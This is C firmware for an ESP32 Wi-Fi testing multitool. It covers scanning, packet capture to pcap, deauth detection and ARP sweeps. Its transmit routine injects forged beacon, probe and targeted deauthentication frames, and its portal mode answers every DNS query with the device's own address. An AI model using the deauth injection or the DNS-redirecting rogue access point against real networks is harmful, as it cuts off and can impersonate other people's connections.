#include "div_service.h"
#include "div_storage.h"
#include "div_protocol.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_netif_net_stack.h"
#include "esp_http_server.h"
#include "esp_timer.h"
#include "esp_mac.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "lwip/sockets.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include <string.h>
#include <stdlib.h>
#include <stdatomic.h>
#include <unistd.h>
#include <time.h>

typedef struct {
    uint32_t length, timestamp;
    int8_t rssi;
    uint8_t channel;
    uint16_t saved;
    uint8_t frame[768];
} packet_t;
static esp_netif_t *sta, *ap;
static bool initialized, running;
static QueueHandle_t packets;
static atomic_uint dropped;
static div_spectrum_capture_t spectrum;
static portMUX_TYPE spectrum_lock=portMUX_INITIALIZER_UNLOCKED;
static atomic_int monitor_channel_delta;
bool div_wifi_monitor_frame(div_spectrum_frame_t *frame)
{
    portENTER_CRITICAL(&spectrum_lock);
    div_spectrum_advance(&spectrum,esp_timer_get_time());
    *frame=spectrum.frame;
    portEXIT_CRITICAL(&spectrum_lock);
    frame->dropped=atomic_load(&dropped);
    return frame->active;
}
void div_wifi_monitor_channel(int delta) { atomic_fetch_add(&monitor_channel_delta,delta); }
static void monitor_rx(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type == WIFI_PKT_MISC || !packets) return;
    const wifi_promiscuous_pkt_t *p = buf;
    if (p->rx_ctrl.rx_state || p->rx_ctrl.sig_len < 4) return;
    portENTER_CRITICAL(&spectrum_lock);
    if (spectrum.active && p->rx_ctrl.channel==spectrum.frame.channel)
        div_spectrum_receive(&spectrum,esp_timer_get_time(),p->rx_ctrl.rssi,
            (p->payload[0]&0xfc)==0xc0 || (p->payload[0]&0xfc)==0xa0);
    portEXIT_CRITICAL(&spectrum_lock);
    packet_t item = {.length = p->rx_ctrl.sig_len - 4, .timestamp = p->rx_ctrl.timestamp,
        .rssi = p->rx_ctrl.rssi, .channel = p->rx_ctrl.channel};
    item.saved = item.length < sizeof(item.frame) ? item.length : sizeof(item.frame);
    memcpy(item.frame, p->payload, item.saved);
    if (xQueueSend(packets, &item, 0) != pdTRUE) atomic_fetch_add(&dropped, 1);
}
static esp_err_t wifi_init(void)
{
    if (initialized) return ESP_OK;
    esp_err_t err = esp_netif_init();
    if (err != ESP_OK) return err;
    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) return err;
    sta = esp_netif_create_default_wifi_sta();
    ap = esp_netif_create_default_wifi_ap();
    if (!sta || !ap) return ESP_ERR_NO_MEM;
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    err = esp_wifi_init(&cfg);
    if (err != ESP_OK) return err;
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    initialized = true;
    return ESP_OK;
}
static esp_err_t wifi_start(wifi_mode_t mode)
{
    esp_err_t err = wifi_init();
    if (err != ESP_OK) return err;
    err = esp_wifi_set_mode(mode);
    if (err != ESP_OK) return err;
    err = esp_wifi_start();
    if (err == ESP_OK) { running = true; esp_wifi_set_ps(WIFI_PS_NONE); }
    return err;
}
static void wifi_stop(void)
{
    if (running) {
        /* Disable the producer before freeing the queue. The driver serializes
           promiscuous configuration with its RX task. */
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_scan_stop();
        esp_wifi_disconnect();
        esp_wifi_stop();
        running = false;
    }
    if (packets) { vQueueDelete(packets); packets = NULL; }
}
static unsigned last_channel(void)
{
    wifi_country_t country;
    if (esp_wifi_get_country(&country) != ESP_OK) return 11;
    unsigned last = country.schan + country.nchan - 1;
    return last > 13 ? 13 : last;
}
static esp_err_t scan(const div_job_t *j)
{
    wifi_scan_config_t cfg = {.show_hidden = true};
    int channel = div_arg_int(j, "channel", 0, 0, last_channel());
    cfg.channel = channel;
    esp_err_t err = esp_wifi_scan_start(&cfg, true);
    if (err != ESP_OK) return err;
    uint16_t total = 0;
    esp_wifi_scan_get_ap_num(&total);
    uint16_t n = total > 64 ? 64 : total;
    wifi_ap_record_t *records = calloc(n ? n : 1, sizeof(*records));
    if (!records) { esp_wifi_clear_ap_list(); return ESP_ERR_NO_MEM; }
    err = esp_wifi_scan_get_ap_records(&n, records);
    if (err == ESP_OK) {
        div_report("%u networks (%u shown)", total, n);
        for (uint16_t i = 0; i < n && !div_job_cancelled(); ++i) {
            wifi_ap_record_t *r = &records[i];
            div_report(MACSTR " ch %u  %d dBm auth %u  %.32s", MAC2STR(r->bssid),
                r->primary, r->rssi, r->authmode, r->ssid[0] ? (char *)r->ssid : "<hidden>");
        }
    }
    esp_wifi_clear_ap_list();
    free(records);
    return err;
}
static FILE *pcap_open(const char *relative)
{
    if (!*relative || !div_storage_ready()) return NULL;
    char path[DIV_PATH_MAX];
    if (div_storage_path(relative,path) != ESP_OK) return NULL;
    FILE *f = fopen(path,"wb");
    if (!f) return NULL;
    struct { uint32_t magic; uint16_t major,minor; int32_t zone; uint32_t sigfig,snap,link; }
        header = {0xa1b2c3d4,2,4,0,0,768,105};
    if (fwrite(&header,sizeof(header),1,f) != 1) { fclose(f); return NULL; }
    return f;
}
static esp_err_t monitor(const div_job_t *j)
{
    packets = xQueueCreate(16,sizeof(packet_t));
    if (!packets) return ESP_ERR_NO_MEM;
    atomic_store(&dropped,0);
    const char *file = div_arg_string(j,"path","");
    FILE *pcap = *file ? pcap_open(file) : NULL;
    if (*file && !pcap) return ESP_FAIL;
    bool wps_only = !strcmp(j->feature->id,"wifi_wps");
    bool hidden = !strcmp(j->feature->id,"wifi_hidden");
    bool deauth = !strcmp(j->feature->id,"wifi_detect");
    bool graph = !strcmp(j->feature->id,"wifi_monitor");
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};
    esp_err_t err = esp_wifi_set_promiscuous_filter(&filter);
    if (err == ESP_OK) err = esp_wifi_set_promiscuous_rx_cb(monitor_rx);
    if (err == ESP_OK) err = esp_wifi_set_promiscuous(true);
    unsigned fixed = div_arg_int(j,"channel",0,0,last_channel()), channel = fixed ? fixed : 1;
    if (err == ESP_OK) err = esp_wifi_set_channel(channel,WIFI_SECOND_CHAN_NONE);
    int seconds=div_arg_int(j,"seconds",15,graph?0:1,3600);
    int64_t until=seconds ? esp_timer_get_time()+(int64_t)seconds*1000000 : INT64_MAX;
    atomic_store(&monitor_channel_delta,0);
    if (graph && err==ESP_OK) {
        portENTER_CRITICAL(&spectrum_lock);
        div_spectrum_begin(&spectrum,esp_timer_get_time(),channel);
        portEXIT_CRITICAL(&spectrum_lock);
    }
    int64_t next_hop = 0, next_report = 0;
    uint32_t counts[14] = {0}, attacks = 0;
    div_wifi_ies_t known[32] = {0};
    unsigned known_count = 0;
    while (err == ESP_OK && !div_job_cancelled() && esp_timer_get_time() < until) {
        int64_t now = esp_timer_get_time();
        int delta=graph?atomic_exchange(&monitor_channel_delta,0):0;
        if (delta) {
            int next=(int)channel-1+delta, last=last_channel();
            next=(next%last+last)%last+1;
            fixed=channel=next;
            err=esp_wifi_set_channel(channel,WIFI_SECOND_CHAN_NONE);
            portENTER_CRITICAL(&spectrum_lock);
            div_spectrum_begin(&spectrum,now,channel);
            portEXIT_CRITICAL(&spectrum_lock);
        }
        if (!fixed && now >= next_hop) {
            channel = channel % last_channel() + 1;
            err = esp_wifi_set_channel(channel,WIFI_SECOND_CHAN_NONE);
            next_hop = now + 250000;
            if (graph) {
                portENTER_CRITICAL(&spectrum_lock);
                div_spectrum_begin(&spectrum,now,channel);
                portEXIT_CRITICAL(&spectrum_lock);
            }
        }
        packet_t p;
        if (xQueueReceive(packets,&p,pdMS_TO_TICKS(20)) == pdTRUE) {
            if (p.channel < 14) ++counts[p.channel];
            if (pcap) {
                struct { uint32_t sec,usec,incl,original; } record = {
                    (uint32_t)(now/1000000),(uint32_t)(now%1000000),p.saved,p.length};
                if (fwrite(&record,sizeof(record),1,pcap) != 1 ||
                    fwrite(p.frame,1,p.saved,pcap) != p.saved) { err = ESP_FAIL; break; }
            }
            if (p.saved >= 24 && ((p.frame[0]&0xfc) == 0xc0 || (p.frame[0]&0xfc) == 0xa0)) {
                ++attacks;
                if (deauth) div_report("Management disconnect: " MACSTR " -> " MACSTR " ch %u %d dBm",
                    MAC2STR(p.frame+10),MAC2STR(p.frame+4),p.channel,p.rssi);
            }
            div_wifi_ies_t info;
            if ((wps_only || hidden) && div_wifi_parse_ies(p.frame,p.saved,&info)) {
                if (wps_only && !info.wps) continue;
                unsigned i;
                for (i=0;i<known_count;++i) if (!memcmp(known[i].bssid,info.bssid,6)) break;
                bool changed = i == known_count || strcmp(known[i].ssid,info.ssid);
                if (i == known_count && known_count < 32) ++known_count;
                if (i < 32 && changed) {
                    bool revealed = known[i].hidden && !info.hidden;
                    known[i] = info;
                    div_report("%s " MACSTR " ch %u %.32s", revealed ? "Revealed" : info.wps ? "WPS" : "SSID",
                        MAC2STR(info.bssid),p.channel,info.hidden ? "<hidden>" : info.ssid);
                }
            }
        }
        if (now >= next_report) {
            div_report("ch %u: %lu packets; disconnect %lu; dropped %u", channel,
                (unsigned long)counts[channel],(unsigned long)attacks,atomic_load(&dropped));
            next_report = now + 1000000;
        }
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    if (graph) {
        portENTER_CRITICAL(&spectrum_lock);
        spectrum.active=false; spectrum.frame.active=false;
        portEXIT_CRITICAL(&spectrum_lock);
    }
    if (pcap && fclose(pcap) != 0) err = ESP_FAIL;
    return err;
}
static esp_err_t transmit(const div_job_t *j)
{
    uint8_t frame[128] = {0};
    bool deauth = !strcmp(j->feature->id,"wifi_deauth");
    bool probe = !strcmp(j->feature->id,"wifi_probe");
    const char *ssid = div_arg_string(j,"ssid","DIV-Lab");
    if (strlen(ssid)>32) return ESP_ERR_INVALID_ARG;
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA,mac);
    unsigned channel = div_arg_int(j,"channel",6,1,last_channel());
    esp_err_t err = esp_wifi_set_channel(channel,WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) return err;
    frame[0] = deauth ? 0xc0 : probe ? 0x40 : 0x80;
    memset(frame+4,0xff,6); memcpy(frame+10,mac,6); memcpy(frame+16,mac,6);
    size_t n = 24;
    if (deauth) {
        size_t decoded;
        if (!div_hex_decode(div_arg_string(j,"bssid",""),frame+10,6,&decoded) || decoded != 6 ||
            !div_hex_decode(div_arg_string(j,"client",""),frame+4,6,&decoded) || decoded != 6)
            return ESP_ERR_INVALID_ARG;
        memcpy(frame+16,frame+10,6);
        frame[n++] = 7; frame[n++] = 0;
    } else {
        if (!probe) {
            n += 8; frame[n++] = 0x64; frame[n++] = 0;
            frame[n++] = 1; frame[n++] = 0;
        } else memset(frame+16,0xff,6);
        frame[n++] = 0; frame[n++] = strlen(ssid);
        memcpy(frame+n,ssid,strlen(ssid)); n+=strlen(ssid);
        const uint8_t rates[] = {1,4,0x82,0x84,0x8b,0x96,3,1};
        memcpy(frame+n,rates,sizeof(rates)); n+=sizeof(rates);
        frame[n++] = channel;
    }
    unsigned count = div_arg_int(j,"count",10,1,10000);
    for (unsigned i=0; i<count && !div_job_cancelled(); ++i) {
        err = esp_wifi_80211_tx(WIFI_IF_STA,frame,n,true);
        if (err != ESP_OK) {
            div_report("Public ESP-IDF TX API rejected frame: %s",esp_err_to_name(err));
            break;
        }
        if (!div_job_delay(div_arg_int(j,"interval",100,20,10000))) break;
    }
    return err;
}
static esp_err_t portal_get(httpd_req_t *req)
{
    static const char page[] = "<!doctype html><meta name=\"viewport\" content=\"width=device-width\">"
        "<title>ESP32-DIV</title><h1>ESP32-DIV lab access point</h1>"
        "<p>You are connected to the device's local test portal.</p>";
    httpd_resp_set_type(req,"text/html");
    return httpd_resp_send(req,page,HTTPD_RESP_USE_STRLEN);
}
static esp_err_t portal(const div_job_t *j)
{
    const char *ssid = div_arg_string(j,"ssid","DIV-Lab"), *password = div_arg_string(j,"password","div-lab-2026");
    if (!*ssid || strlen(ssid)>32 || (strlen(password)>0 && (strlen(password)<8 || strlen(password)>63)))
        return ESP_ERR_INVALID_ARG;
    wifi_config_t cfg = {0};
    memcpy(cfg.ap.ssid,ssid,strlen(ssid)); cfg.ap.ssid_len=strlen(ssid);
    strlcpy((char *)cfg.ap.password,password,sizeof(cfg.ap.password));
    cfg.ap.channel = 6; cfg.ap.max_connection = 4;
    cfg.ap.authmode = *password ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN;
    esp_err_t err = esp_wifi_set_config(WIFI_IF_AP,&cfg);
    if (err != ESP_OK) return err;
    httpd_handle_t server = NULL;
    httpd_config_t http = HTTPD_DEFAULT_CONFIG();
    http.uri_match_fn = httpd_uri_match_wildcard;
    http.max_open_sockets = 4;
    err = httpd_start(&server,&http);
    if (err != ESP_OK) return err;
    httpd_uri_t uri = {.uri="/*",.method=HTTP_GET,.handler=portal_get};
    err = httpd_register_uri_handler(server,&uri);
    int sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
    if (sock < 0) { httpd_stop(server); return ESP_FAIL; }
    struct timeval timeout = {.tv_sec=0,.tv_usec=200000};
    setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&timeout,sizeof(timeout));
    struct sockaddr_in local = {.sin_family=AF_INET,.sin_port=htons(53),.sin_addr.s_addr=htonl(INADDR_ANY)};
    if (bind(sock,(struct sockaddr *)&local,sizeof(local)) != 0) err=ESP_FAIL;
    div_report("AP: %s  portal: http://192.168.4.1",ssid);
    int64_t end=esp_timer_get_time()+(int64_t)div_arg_int(j,"seconds",120,1,3600)*1000000;
    while (err == ESP_OK && !div_job_cancelled() && esp_timer_get_time()<end) {
        uint8_t query[512],answer[528]; struct sockaddr_in client; socklen_t slen=sizeof(client);
        int n=recvfrom(sock,query,sizeof(query),0,(struct sockaddr *)&client,&slen);
        if (n>0) {
            const uint8_t ip[4]={192,168,4,1};
            size_t size=div_dns_answer(query,n,answer,sizeof(answer),ip);
            if (size) sendto(sock,answer,size,0,(struct sockaddr *)&client,slen);
        }
    }
    close(sock); httpd_stop(server);
    return err;
}
typedef struct { struct netif *netif; ip4_addr_t address; bool list; } arp_ctx_t;
static esp_err_t arp_tcpip(void *arg)
{
    arp_ctx_t *ctx=arg;
    if (!ctx->list) return etharp_request(ctx->netif,&ctx->address)==ERR_OK ? ESP_OK : ESP_FAIL;
    for (unsigned i=0;i<ARP_TABLE_SIZE;++i) {
        ip4_addr_t *ip; struct netif *nif; struct eth_addr *mac;
        if (etharp_get_entry(i,&ip,&nif,&mac) && nif==ctx->netif)
            div_report("%s  " MACSTR,ip4addr_ntoa(ip),MAC2STR(mac->addr));
    }
    return ESP_OK;
}
static esp_err_t arp_scan(const div_job_t *j)
{
    const char *ssid=div_arg_string(j,"ssid",""), *pass=div_arg_string(j,"password","");
    if (!*ssid || strlen(ssid)>32 || strlen(pass)>63) return ESP_ERR_INVALID_ARG;
    wifi_config_t cfg={0};
    memcpy(cfg.sta.ssid,ssid,strlen(ssid)); memcpy(cfg.sta.password,pass,strlen(pass));
    esp_err_t err=esp_wifi_set_config(WIFI_IF_STA,&cfg);
    if (err == ESP_OK) err=esp_wifi_connect();
    if (err != ESP_OK) return err;
    esp_netif_ip_info_t info={0};
    int timeout=div_arg_int(j,"seconds",15,1,120)*10;
    while (timeout-- && !div_job_cancelled()) {
        esp_netif_get_ip_info(sta,&info);
        if (info.ip.addr) break;
        div_job_delay(100);
    }
    if (!info.ip.addr) return ESP_ERR_TIMEOUT;
    uint32_t own=ntohl(info.ip.addr), mask=ntohl(info.netmask.addr), base=own&mask, end=base|~mask;
    if (end-base > 1024) { div_report("Subnet is larger than 1024 addresses; narrow the network first."); return ESP_ERR_INVALID_SIZE; }
    arp_ctx_t ctx={.netif=esp_netif_get_netif_impl(sta)};
    for (uint32_t ip=base+1;ip<end && !div_job_cancelled();++ip) {
        if (ip==own) continue;
        ctx.address.addr=htonl(ip); ctx.list=false;
        err=esp_netif_tcpip_exec(arp_tcpip,&ctx);
        if (err!=ESP_OK) break;
        div_job_delay(50);
        ctx.list=true;
        esp_netif_tcpip_exec(arp_tcpip,&ctx);
    }
    return err;
}
esp_err_t div_wifi_job(const div_job_t *j)
{
    const char *id=j->feature->id;
    bool is_portal=!strcmp(id,"wifi_portal") || !strcmp(id,"wifi_karma");
    esp_err_t err=wifi_start(is_portal ? WIFI_MODE_AP : WIFI_MODE_STA);
    if (err==ESP_OK) {
        if (!strcmp(id,"wifi_scan")) err=scan(j);
        else if (is_portal) err=portal(j);
        else if (!strcmp(id,"wifi_arp")) err=arp_scan(j);
        else if (!strcmp(id,"wifi_beacon") || !strcmp(id,"wifi_probe") || !strcmp(id,"wifi_deauth")) err=transmit(j);
        else err=monitor(j);
    }
    wifi_stop();
    return err;
}

esp_err_t div_wifi_observe(div_observation_fn callback, void *context)
{
    if (!callback) return ESP_ERR_INVALID_ARG;
    esp_err_t err = wifi_start(WIFI_MODE_STA);
    wifi_scan_config_t config = {.show_hidden=true};
    if (err == ESP_OK) err = esp_wifi_scan_start(&config, true);
    uint16_t n = 48;
    wifi_ap_record_t *records = calloc(n, sizeof(*records));
    if (!records) err = ESP_ERR_NO_MEM;
    if (err == ESP_OK) err = esp_wifi_scan_get_ap_records(&n, records);
    if (err == ESP_OK) for (unsigned i = 0; i < n && !div_job_cancelled(); ++i) {
        div_observation_t value = {.channel=records[i].primary, .rssi=records[i].rssi};
        memcpy(value.mac, records[i].bssid, 6);
        memcpy(value.name, records[i].ssid, 32);
        callback(&value, context);
    }
    if (initialized) esp_wifi_clear_ap_list();
    free(records); wifi_stop();
    return err;
}
